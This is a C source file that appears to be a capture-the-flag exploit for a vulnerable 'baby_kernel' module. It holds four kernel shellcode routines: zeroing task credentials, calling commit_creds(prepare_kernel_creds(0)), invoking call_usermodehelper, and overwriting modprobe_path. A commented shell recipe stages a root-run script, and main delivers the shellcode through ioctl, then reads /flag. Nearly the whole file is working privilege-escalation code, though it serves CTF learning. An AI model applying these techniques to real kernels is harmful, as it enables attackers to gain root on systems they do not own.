#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define BABY_KERNEL_IOCTL 0xFFFFFFFFC00000C0 //nedded for debugging
#define PREPARE_KERNEL_CREDS 0xFFFFFFFF81094670
#define COMMIT_CREDS 0xFFFFFFFF810943D0
#define CALL_USERMODHELPER 0xFFFFFFFF81086630
#define MODPROBE_PATH 0xFFFFFFFF82851660

/* Manually change the credentials (userID) in the task struct. To do so we debug the commits creds function. */
void shellcode_1(){
  asm volatile( //volatile -> keyword "do not optimize the code"
    "mov rdi, gs:0x1AD00\n"
    "mov rsi, [rdi + 0x740]\n"
    "mov QWORD PTR [rsi+0x8], 0\n"
    "mov QWORD PTR [rsi+0x10], 0\n"
    "mov QWORD PTR [rsi+0x18], 0\n"
    "mov QWORD PTR [rsi+0x20], 0\n"
  );
  // move the current pointer (current process) into rdi (taken from ida)
  // move into rsi the rdi + off : now into rsi we have the creds
  // set to 0 all the user credential
  // when we return have root priviledges
}

/* Call prepare_kernel_creds and commit_creds.
 idea: commit_creds(prepare_kernel_creds(0)) */
void shellcode_2(){
  unsigned long long *root_creds; 
  asm volatile(
    "mov rax, %0\n" //%0 represent the parameter (input)
    "mov rdi, 0\n"
    "call rax\n"
    : "=a"(root_creds) //outputs
    : "r"(PREPARE_KERNEL_CREDS) //inputs
    : "rdi" //clobbers (that the compile should not use)
  );
  //printf("root_creds: %p\n", root_creds);
  asm volatile(
    "mov rax, %0\n"
    "mov rdi, %1\n"
    "call rax\n"
    :
    : "r"(COMMIT_CREDS), "r"(root_creds)
    : "rdi", "rax"
  );
}

/* another way of writing the same shellcode
void shellcode_2(){
  asm volatile(
    "mov rdi, 0\n"
    "mov rax, 0xFFFFFFFF81094670\n"
    "call rax\n"
    "mov rdi, rax\n" // pass root_creds directly 
    "mov rax, 0xFFFFFFFF810943D0\n"
    "call rax\n"
  );
} */

/* Parameters for execve() */
const char* argv[] = {"/bin/chown\0", "1000:1000\0", "/flag\0", NULL};

/* call_usermodelhelper(path, argv, envp, wait). */
void shellcode_3(){
  asm volatile(
      "mov rdi, %0\n"
      "mov rsi, %1\n"
      "mov rdx, 0\n"
      "mov r10, 2\n" // wait for the process to complete 
      "mov rax, %2\n" // address to call
      "call rax\n"
      :
      : "r"(argv[0]), "r"(argv), "r"(CALL_USERMODHELPER)
      : "rdi", "rsi", "rdx", "r10", "rax"
   );
}

/* Change modprobe_path() call. 
 On remote I have to create a file "a.sh" containing "#!/bin/sh\n /bin/shown 1000:1000 /flag" and a file "b" containing "\x00":
~ $ echo -ne "\x00" > b 
~ $ echo "#!/bin/sh" >> a.sh
~ $ echo "" >> a.sh
~ $ echo "/bin/chown 1000:1000 /flag" >> a.sh
~ $ cat a.sh
Then I make both of them executable
~ $ chmod +x b
~ $ chmod +x a.sh
And then we call the invalid file b, and since we have changed the modprobepath it will call a.sh. */
void shellcode_4(){
  asm volatile(
    "mov rsi, %0\n"
    "mov rdi, 0x68732e612f\n"
    "mov QWORD PTR [rsi], rdi\n" // b"a.sh"[::-1].hex()
    : 
    : "r"(MODPROBE_PATH)
    : "rsi", "rdi"
  );
}

int main(){
  int fd;
  
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  fd = open("./dev/baby_kernel", O_RDWR);
  if(fd < 0){
    perror("Error in opening the file");
    return 1;
  }
  printf("File opened. fs = %d", fd);
  ioctl(fd, 1337, shellcode_4); //here we need to pass a pointer to some shellcode
  
  //should be root
  close(fd);

  fd = open("/flag", O_RDONLY);
  if(fd < 0){
    perror("Error in opening the file");
    return 1;
  }
  printf("Flag opened. fs = %d", fd);
  char buf[0x100];
  read(fd, buf, sizeof(buf));
  printf("Flag: %s", buf);
    
  return 0;
}


